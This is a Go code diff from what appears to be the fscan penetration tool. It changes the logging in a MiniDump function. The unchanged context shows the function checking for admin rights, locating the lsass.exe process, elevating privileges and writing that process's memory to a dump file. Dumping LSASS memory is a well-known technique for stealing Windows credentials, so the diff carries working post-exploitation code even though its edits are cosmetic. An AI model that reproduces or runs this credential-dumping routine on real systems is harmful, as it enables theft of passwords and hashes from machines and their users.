@@ -279,26 +279,30 @@ func IsAdmin() bool {
 func MiniDump(info *Common.HostInfo) (err error) {
 	// 先检查管理员权限
 	if !IsAdmin() {
+		Common.LogError("需要管理员权限才能执行此操作")
 		return fmt.Errorf("需要管理员权限才能执行此操作")
 	}
 
 	pm, err := NewProcessManager()
 	if err != nil {
+		Common.LogError(fmt.Sprintf("初始化进程管理器失败: %v", err))
 		return fmt.Errorf("初始化进程管理器失败: %v", err)
 	}
 
 	// 查找 lsass.exe
 	pid, err := pm.FindProcess("lsass.exe")
 	if err != nil {
+		Common.LogError(fmt.Sprintf("查找进程失败: %v", err))
 		return fmt.Errorf("查找进程失败: %v", err)
 	}
-	fmt.Printf("找到进程 lsass.exe, PID: %d\n", pid)
+	Common.LogSuccess(fmt.Sprintf("找到进程 lsass.exe, PID: %d", pid))
 
 	// 提升权限
 	if err := pm.ElevatePrivileges(); err != nil {
+		Common.LogError(fmt.Sprintf("提升权限失败: %v", err))
 		return fmt.Errorf("提升权限失败: %v", err)
 	}
-	fmt.Println("成功提升进程权限")
+	Common.LogSuccess("成功提升进程权限")
 
 	// 创建输出路径
 	outputPath := filepath.Join(".", fmt.Sprintf("fscan-%d.dmp", pid))
@@ -306,9 +310,10 @@ func MiniDump(info *Common.HostInfo) (err error) {
 	// 执行转储
 	if err := pm.DumpProcess(pid, outputPath); err != nil {
 		os.Remove(outputPath)
+		Common.LogError(fmt.Sprintf("进程转储失败: %v", err))
 		return fmt.Errorf("进程转储失败: %v", err)
 	}
 
-	fmt.Printf("成功将进程内存转储到文件: %s\n", outputPath)
+	Common.LogSuccess(fmt.Sprintf("成功将进程内存转储到文件: %s", outputPath))
 	return nil
 }
